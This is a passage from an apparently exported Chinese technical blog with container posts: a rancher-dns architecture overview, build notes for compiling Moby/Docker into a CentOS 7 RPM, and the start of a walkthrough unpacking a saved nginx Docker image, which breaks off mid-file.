<h1 id="rancher-dns结构"><a href="#rancher-dns结构" class="headerlink" title="rancher-dns结构"></a>rancher-dns结构</h1><p><img src="/images/rancher/rancher-dns-struct.png" alt="rancher-dns-struct"></p>
<ul>
<li>TCP、UDP Listen<br>  rancher-dns监听53端口，用于接收域名解析请求。</li>
<li>miekg DNS<br>  DNS协议封装解析库</li>
<li>ROUTE<br>  处理域名解析业务逻辑</li>
<li>metadata client<br>  负责与rancher-metadata同步answer数据，每5秒同步一次。</li>
<li>answers<br>  负责存储解析<code>metadata client</code>同步来的answer数据（<code>/etc/rancher/answers.json</code>）</li>
</ul>
<h1 id="rancher-dns-ROUTE工作流程"><a href="#rancher-dns-ROUTE工作流程" class="headerlink" title="rancher-dns ROUTE工作流程"></a>rancher-dns ROUTE工作流程</h1><p><img src="/images/rancher/rancher-dns-route-workflow.png" alt="rancher-dns-route-workflow"></p>
<p>*** 关于域名协议流程参见：<a href="https://zhoubofsy.github.io/2017/02/17/network/dns-protocol/">《DNS协议》</a>中相关内容 ***</p>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>dns</tag>
        <tag>rancher</tag>
      </tags>
  </entry>
  <entry>
    <title>Moby（Docker）编译趟坑</title>
    <url>/2017/06/09/container/docker/docker-compile/</url>
    <content><![CDATA[<p>今天是2017年6月12日，在此之前Docker就已经更名为moby了，就moby的的编译与之前docker的编译无异，为什么呢，因为无论是docker还是moby，都将自己的编译放在了容器中，编译所依赖的包也在容器中完成安装，目前moby（以下都以此替代docker）能直接编译出rpm、deb两种安装包，具体支持哪些平台，哪些操作系统，请见<code>./contrib/builder/</code>。</p>
<p>本文主要以编译<code>centos7</code>能用的rpm包为例，对moby的编译配置文件进行了修改，从而使moby快速完成编译。</p>
<h1 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> Debian:jessie</span><br><span class="line">+-------------+                              golang 1.7.5-alpine</span><br><span class="line">|             |                          +------------------------+ </span><br><span class="line">|  Moby       | ----- docker run -----&gt;  | docker manpage compile |</span><br><span class="line">|  Compile    |                          +------------------------+             centos:7</span><br><span class="line">|  Container  |                                                         +--------------------+</span><br><span class="line">|             | -------------- docker run ----------------------------&gt; |  build centos rpm  |                           </span><br><span class="line">+-------------+                                                         +--------------------+</span><br></pre></td></tr></table></figure>

<p>Moby先创建一个Debian的容器，编译Moby，然后该容器根据用户输入的参数决定使用哪些容器编译哪些安装包，在编译目标安装包之前会使用golang容器编译manpage。总之moby的所有编译工作都是在容器中进行的。</p>
<h1 id="编译方法"><a href="#编译方法" class="headerlink" title="编译方法"></a>编译方法</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>宿主机<br>  RHEL7.2</li>
<li>docker<br>  17.04.0-ce</li>
</ul>
<h2 id="RPM-Only-CentOS"><a href="#RPM-Only-CentOS" class="headerlink" title="RPM (Only CentOS)"></a>RPM (Only CentOS)</h2><ul>
<li>获取 moby 代码  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">clone</span> moby</span></span><br><span class="line">git clone https://github.com/moby/moby.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到17.04.0-ce版本</span></span><br><span class="line">git checkout -b building_v17.04.0-ce v17.04.0-ce</span><br></pre></td></tr></table></figure></li>
<li>修改Dockerfile  <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">diff --git <span class="keyword">a</span>/Dockerfile <span class="keyword">b</span>/Dockerfile</span><br><span class="line"><span class="built_in">index</span> <span class="number">8</span>a361ce..<span class="number">3</span>d6b0bb <span class="number">100644</span></span><br><span class="line">--- <span class="keyword">a</span>/Dockerfile</span><br><span class="line">+++ <span class="keyword">b</span>/Dockerfile</span><br><span class="line">@@ -<span class="number">34</span>,<span class="number">8</span> +<span class="number">34</span>,<span class="number">12</span> @@ COPY <span class="built_in">keys</span>/launchpad-ppa-zfs.asc /<span class="keyword">go</span>/src/github.<span class="keyword">com</span>/docker/docker/<span class="built_in">keys</span>/</span><br><span class="line"> RUN apt-key <span class="built_in">add</span> /<span class="keyword">go</span>/src/github.<span class="keyword">com</span>/docker/docker/<span class="built_in">keys</span>/launchpad-ppa-zfs.asc</span><br><span class="line"> RUN <span class="keyword">echo</span> <span class="keyword">deb</span> http://ppa.launchpad.net/zfs-native/stable/ubuntu trusty main &gt; /etc/apt/sources.<span class="keyword">list</span>.d/zfs.<span class="keyword">list</span></span><br><span class="line"></span><br><span class="line">+RUN apt-<span class="built_in">get</span> clean</span><br><span class="line">+RUN apt-<span class="built_in">get</span> <span class="keyword">update</span> -<span class="keyword">o</span> Acquire::http::No-Cache=True</span><br><span class="line">+</span><br><span class="line"> # Packaged dependencies</span><br><span class="line">-RUN apt-<span class="built_in">get</span> <span class="keyword">update</span> &amp;&amp; apt-<span class="built_in">get</span> install -<span class="keyword">y</span> \</span><br><span class="line">+# RUN apt-<span class="built_in">get</span> <span class="keyword">update</span> &amp;&amp; apt-<span class="built_in">get</span> install -<span class="keyword">y</span> \</span><br><span class="line">+RUN apt-<span class="built_in">get</span> install -<span class="keyword">y</span> \</span><br><span class="line">        apparmor \</span><br><span class="line">        apt-utils \</span><br><span class="line">        aufs-tools \</span><br><span class="line">@@ -<span class="number">112</span>,<span class="number">10</span> +<span class="number">116</span>,<span class="number">12</span> @@ ENV PATH /osxcross/target/bin:$PATH</span><br><span class="line"> ENV SECCOMP_VERSION <span class="number">2.3</span>.<span class="number">2</span></span><br><span class="line"> RUN <span class="keyword">set</span> -<span class="keyword">x</span> \</span><br><span class="line">        &amp;&amp; export SECCOMP_PATH=<span class="string">&quot;$(mktemp -d)&quot;</span> \</span><br><span class="line">-       &amp;&amp; curl -fsSL <span class="string">&quot;https://github.com/seccomp/libseccomp/releases/download/v$&#123;SECCOMP_VERSION&#125;/libseccomp-$&#123;SECCOMP_VERSION&#125;.tar.gz&quot;</span> \</span><br><span class="line">+       # &amp;&amp; curl -fsSL <span class="string">&quot;https://github.com/seccomp/libseccomp/releases/download/v$&#123;SECCOMP_VERSION&#125;/libseccomp-$&#123;SECCOMP_VERSION&#125;.tar.gz&quot;</span> \</span><br><span class="line">+       &amp;&amp; curl -fsSL <span class="string">&quot;https://github.com/seccomp/libseccomp/archive/v$&#123;SECCOMP_VERSION&#125;.tar.gz&quot;</span> \</span><br><span class="line">                | tar -xzC <span class="string">&quot;$SECCOMP_PATH&quot;</span> --strip-components=<span class="number">1</span> \</span><br><span class="line">        &amp;&amp; ( \</span><br><span class="line">                <span class="keyword">cd</span> <span class="string">&quot;$SECCOMP_PATH&quot;</span> \</span><br><span class="line">+        &amp;&amp; ./autogen.<span class="keyword">sh</span> \</span><br><span class="line">                &amp;&amp; ./configure --prefix=/usr/local \</span><br><span class="line">                &amp;&amp; <span class="keyword">make</span> \</span><br><span class="line">                &amp;&amp; <span class="keyword">make</span> install \</span><br></pre></td></tr></table></figure></li>
<li>去掉DM(DeviceMapper)支持  <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">diff --git <span class="keyword">a</span>/hack/<span class="keyword">make</span>/.integration-daemon-start <span class="keyword">b</span>/hack/<span class="keyword">make</span>/.integration-daemon-start</span><br><span class="line"><span class="built_in">index</span> <span class="number">0</span>bc8b96..bea0d70 <span class="number">100644</span></span><br><span class="line">--- <span class="keyword">a</span>/hack/<span class="keyword">make</span>/.integration-daemon-start</span><br><span class="line">+++ <span class="keyword">b</span>/hack/<span class="keyword">make</span>/.integration-daemon-start</span><br><span class="line">@@ -<span class="number">71</span>,<span class="number">7</span> +<span class="number">71</span>,<span class="number">7</span> @@ <span class="keyword">if</span> [ -<span class="keyword">z</span> <span class="string">&quot;$DOCKER_TEST_HOST&quot;</span> ]; then</span><br><span class="line">        ( <span class="keyword">set</span> -<span class="keyword">x</span>; exec \</span><br><span class="line">                dockerd --<span class="keyword">debug</span> \</span><br><span class="line">                --host <span class="string">&quot;$DOCKER_HOST&quot;</span> \</span><br><span class="line">-               --storage-driver <span class="string">&quot;$DOCKER_GRAPHDRIVER&quot;</span> \</span><br><span class="line">+               # --storage-driver <span class="string">&quot;$DOCKER_GRAPHDRIVER&quot;</span> \</span><br><span class="line">                --pidfile <span class="string">&quot;$DEST/docker.pid&quot;</span> \</span><br><span class="line">                --userland-proxy=<span class="string">&quot;$DOCKER_USERLANDPROXY&quot;</span> \</span><br><span class="line">                $storage_params \</span><br></pre></td></tr></table></figure></li>
<li>由于GFW的原因，去掉manpage中关于<code>golang.org/x/sys</code>的安装  <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">diff --git <span class="keyword">a</span>/man/glide.lock <span class="keyword">b</span>/man/glide.lock</span><br><span class="line"><span class="built_in">index</span> <span class="number">5</span>ec765a..<span class="number">2</span>ecad45 <span class="number">100644</span></span><br><span class="line">--- <span class="keyword">a</span>/man/glide.lock</span><br><span class="line">+++ <span class="keyword">b</span>/man/glide.lock</span><br><span class="line">@@ -<span class="number">38</span>,<span class="number">10</span> +<span class="number">38</span>,<span class="number">6</span> @@ imports:</span><br><span class="line">   <span class="keyword">version</span>: dabebe21bf790f782ea4c7bbd2efc430de182afd</span><br><span class="line"> - name: github.<span class="keyword">com</span>/spf13/viper</span><br><span class="line">   <span class="keyword">version</span>: c1ccc378a054ea8d4e38d8c67f6938d4760b53dd</span><br><span class="line">-- name: golang.org/<span class="keyword">x</span>/sys</span><br><span class="line">-  <span class="keyword">version</span>: <span class="number">62</span>bee037599929a6e9146f29d10dd5208c43507d</span><br><span class="line">-  subpackages:</span><br><span class="line">-  - unix</span><br><span class="line"> - name: gopkg.in/yaml.v2</span><br><span class="line">   <span class="keyword">version</span>: a83829b6f1293c91addabc89d0571c246397bbf4</span><br><span class="line"> - name: github.<span class="keyword">com</span>/spf13/cobra</span><br></pre></td></tr></table></figure></li>
<li>删除<code>amd64</code>平台下的与<code>centos7</code>无关的目录  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rvf contrib/builder/rpm/amd64/amazonlinux-latest/</span><br><span class="line">rm -rvf contrib/builder/rpm/amd64/fedora-24/</span><br><span class="line">rm -rvf contrib/builder/rpm/amd64/fedora-25/</span><br><span class="line">rm -rvf contrib/builder/rpm/amd64/opensuse-13.2/</span><br><span class="line">rm -rvf contrib/builder/rpm/amd64/oraclelinux-6/</span><br><span class="line">rm -rvf contrib/builder/rpm/amd64/oraclelinux-7/</span><br><span class="line">rm -rvf contrib/builder/rpm/amd64/photon-1.0/</span><br></pre></td></tr></table></figure></li>
<li>修改<code>contrib/builder/rpm/amd64/centos-7/Dockerfile</code><br>  由于docker 17.04.0-ce这个版本是由golang1.7.5这个版本所编译的，所以在centos容器中需要安装golang1.7.5，而golangtc.com上没有1.7.5这个版本，所以只能通过vpn去golang.org上获取  <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">diff --git <span class="keyword">a</span>/contrib/builder/rpm/amd64/centos-<span class="number">7</span>/Dockerfile <span class="keyword">b</span>/contrib/builder/rpm/amd64/centos-<span class="number">7</span>/Dockerfile</span><br><span class="line"><span class="built_in">index</span> <span class="number">5986</span>dfd..b1f024d <span class="number">100644</span></span><br><span class="line">--- <span class="keyword">a</span>/contrib/builder/rpm/amd64/centos-<span class="number">7</span>/Dockerfile</span><br><span class="line">+++ <span class="keyword">b</span>/contrib/builder/rpm/amd64/centos-<span class="number">7</span>/Dockerfile</span><br><span class="line">@@ -<span class="number">9</span>,<span class="number">7</span> +<span class="number">9</span>,<span class="number">9</span> @@ RUN yum -<span class="keyword">y</span> swap -- <span class="built_in">remove</span> systemd-container systemd-container-libs -- install <span class="keyword">sy</span></span><br><span class="line"> RUN yum install -<span class="keyword">y</span> btrfs-progs-devel device-mapper-devel glibc-static libseccomp-devel libselinux-devel libtool-ltdl-devel pkgconfig selinux-policy selinux-policy-devel systemd-devel tar git cmake <span class="keyword">vim</span>-common</span><br><span class="line"></span><br><span class="line"> ENV GO_VERSION <span class="number">1.7</span>.<span class="number">5</span></span><br><span class="line">+ENV https_proxy <span class="number">192.168</span>.<span class="number">1.230</span>:<span class="number">1080</span></span><br><span class="line"> RUN curl -fSL <span class="string">&quot;https://golang.org/dl/go$&#123;GO_VERSION&#125;.linux-amd64.tar.gz&quot;</span> | tar xzC /usr/local</span><br><span class="line">+# RUN curl -fSL <span class="string">&quot;https://www.golangtc.com/static/go/$&#123;GO_VERSION&#125;/go$&#123;GO_VERSION&#125;.linux-amd64.tar.gz&quot;</span> | tar xzC /usr/local</span><br><span class="line"> ENV PATH $PATH:/usr/local/<span class="keyword">go</span>/bin</span><br><span class="line"></span><br><span class="line"> ENV AUTO_GOPATH <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li>使用Makefile编译Moby<br>  完成了上述Dockerfile的修改以后，可以使用make进行编译，由于我们需要编译的是rpm安装包，所以可直接使用<code>make rpm</code>进行。更多编译操作，可通过<code>make help</code>查看。</li>
</ul>
<p>*** 目前，Moby的编译主要问题处在GFW对网络封锁上，如遇到其它问题，请第一时间确认该网络是否能访问，尤其是中国大陆地区。 ***</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.ybojj.com/docker%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91/">docker源代码编译</a></li>
<li>感谢同事为我提供的VPN服务</li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Untar Docker Image</title>
    <url>/2017/12/01/container/docker/docker-image-untar/</url>
    <content><![CDATA[<p>docker中容器的运行离不开image，一个image中都存放有哪些东西呢？这些东西又是以何种方式组织在一起的呢？今天让我们来撕开这层面纱，看看image到底是什么样。</p>
<h1 id="撕"><a href="#撕" class="headerlink" title="撕"></a>撕</h1><h2 id="导出tar包"><a href="#导出tar包" class="headerlink" title="导出tar包"></a>导出tar包</h2><p>首先我们使用<code>docker save</code>，将一个docker image保存成tar包，我们以<code>nginx官方镜像</code>为例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker images</span></span><br><span class="line">REPOSITORY                               TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">nginx                                   1.11.3              4efb2fcdb1ab        15 months ago       183MB</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker save nginx:1.11.3 -o ./nginx.tar</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvf ./nginx.tar -C ./nginx</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l ./</span></span><br><span class="line">drwxrwxr-x 5 zhoub zhoub      4096 11月 28 16:55 nginx</span><br><span class="line">-rw------- 1 zhoub zhoub 191400960 11月 28 16:52 nginx.tar</span><br></pre></td></tr></table></figure>

<h2 id="走近nginx目录"><a href="#走近nginx目录" class="headerlink" title="走近nginx目录"></a>走近nginx目录</h2><p>现在<code>nginx.tar</code>已经被解开了，接下来就要进入nginx目录一探究竟了。首先<code>tree</code>一下nginx目录，看看都有什么文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 2 ./nginx</span></span><br><span class="line">./nginx</span><br><span class="line">├── 01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef</span><br><span class="line">│   ├── json</span><br><span class="line">│   ├── layer</span><br><span class="line">│   ├── layer.tar</span><br><span class="line">│   └── VERSION</span><br><span class="line">├── 4efb2fcdb1ab05fb03c9435234343c1cc65289eeb016be86193e88d3a5d84f6b.json</span><br><span class="line">├── 80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872</span><br><span class="line">│   ├── json</span><br><span class="line">│   ├── layer</span><br><span class="line">│   ├── layer.tar</span><br><span class="line">│   └── VERSION</span><br><span class="line">├── c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f</span><br><span class="line">│   ├── json</span><br><span class="line">│   ├── layer</span><br><span class="line">│   ├── layer.tar</span><br><span class="line">│   └── VERSION</span><br><span class="line">├── manifest.json</span><br><span class="line">└── repositories</span><br></pre></td></tr></table></figure>
<p>从目录结构上来看，有三个总体的描述文件<code>repositories</code>、<code>manifest.json</code>、<code>4efb2fcdb1ab05fb03c9435234343c1cc65289eeb016be86193e88d3a5d84f6b.json</code>，还有三个目录，这三个目录的结构基本相同都由<code>json</code>、<code>layer</code>、<code>VERSION</code>组成。</p>
<p>通过这些名字，我们先简单猜测一下，image由很多layer组成，上层layer基于下层layer构建而成，下层layer基于基层layer构成。到底image是不是按我们的猜测构成的呢，让我们来看一看总体描述的三个文件。</p>
<p>manifest.json:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;Config&quot;</span><span class="punctuation">:</span><span class="string">&quot;4efb2fcdb1ab05fb03c9435234343c1cc65289eeb016be86193e88d3a5d84f6b.json&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RepoTags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;nginx:1.11.3&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;Layers&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872/layer.tar&quot;</span><span class="punctuation">,</span><span class="string">&quot;c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f/layer.tar&quot;</span><span class="punctuation">,</span><span class="string">&quot;01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef/layer.tar&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
<p>通过<code>manifest.json</code>文件我们可以看出，<code>nginx:1.11.3</code>这个image的配置文件是<code>4efb2fcdb1ab05fb03c9435234343c1cc65289eeb016be86193e88d3a5d84f6b.json</code>，layer一共有三个分别是<code>80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872/layer.tar</code>，<code>c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f/layer.tar</code>，<code>01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef/layer.tar</code>。</p>
<p>image的配置文件中都对image进行了哪些配置呢？让我们来看一看<br>4efb2fcdb1ab05fb03c9435234343c1cc65289eeb016be86193e88d3a5d84f6b.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;architecture&quot;</span><span class="punctuation">:</span><span class="string">&quot;amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;2da0903ff372&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;443/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span><span class="string">&quot;NGINX_VERSION=1.11.3-1~jessie&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;nginx&quot;</span><span class="punctuation">,</span><span class="string">&quot;-g&quot;</span><span class="punctuation">,</span><span class="string">&quot;daemon off;&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ArgsEscaped&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:27ca9d70a764c6955e354f5fdc706b03ed47601213ac9fc638a8943fcc7680f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container&quot;</span><span class="punctuation">:</span><span class="string">&quot;25ab8b143580751e438246801e7ba720f6f84ee9faca3522532e7fbe1ed7021f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container_config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;2da0903ff372&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;443/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span><span class="string">&quot;NGINX_VERSION=1.11.3-1~jessie&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/bin/sh&quot;</span><span class="punctuation">,</span><span class="string">&quot;-c&quot;</span><span class="punctuation">,</span><span class="string">&quot;#(nop) CMD [\&quot;nginx\&quot; \&quot;-g\&quot; \&quot;daemon off;\&quot;]&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ArgsEscaped&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:27ca9d70a764c6955e354f5fdc706b03ed47601213ac9fc638a8943fcc7680f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:51:23.709520142Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;docker_version&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.10.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-07-28T17:47:54.990622865Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) ADD file:0e0565652aa852f62033d99f84892216020d30f64521ded5e72d4940bc4c9697 in /&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-07-28T17:47:55.809686499Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) CMD [\&quot;/bin/bash\&quot;]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:49:31.945397165Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) MAINTAINER NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:49:33.057946615Z&quot;</span><span class="punctuation">,</span><span 